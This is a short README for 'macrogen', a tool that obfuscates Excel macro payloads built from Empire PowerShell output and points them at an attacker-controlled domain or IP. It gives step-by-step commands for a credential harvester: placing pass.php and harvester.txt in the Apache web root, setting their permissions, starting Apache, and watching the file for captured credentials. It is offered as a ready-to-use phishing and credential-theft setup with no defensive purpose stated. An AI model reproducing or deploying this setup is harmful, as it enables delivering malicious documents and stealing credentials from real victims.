# macrogen
# Microsoft Excel macro payload obfuscation generator
# Usage: python macrogen.py [path to base64 encoded powershell payload] [attacker controlled domain name or external IP]
</br>
</br><b>Create the payload in Empire PowerShell</b>
</br>Remove "powershell.exe -NoP -NonI -W Hidden -Enc" from the payload created by Empire and save to a file.
</br>
</br><b>Copy pass.php and create harvester.txt in /var/www/html</b>
</br>cp pass.php /var/www/html/
</br>touch /var/www/html/harvester.txt
</br>
</br><b>Change ownership and permissions on harvester.txt and pass.php</b>
</br>chmod 755 /var/www/html/harvester.txt 
</br>chmod 755 /var/www/html/pass.php
</br>chown www-data:www-data /var/www/html/harvester.txt
</br>chown www-data:www-data /var/www/html/pass.php
</br>
</br><b>Start Apache on TCP port 80</b>
</br>service apache2 start
</br>
</br><b>Monitor the harvester.txt iile for creds</b>
</br>tail -f /var/www/html/harvester.txt
</br>
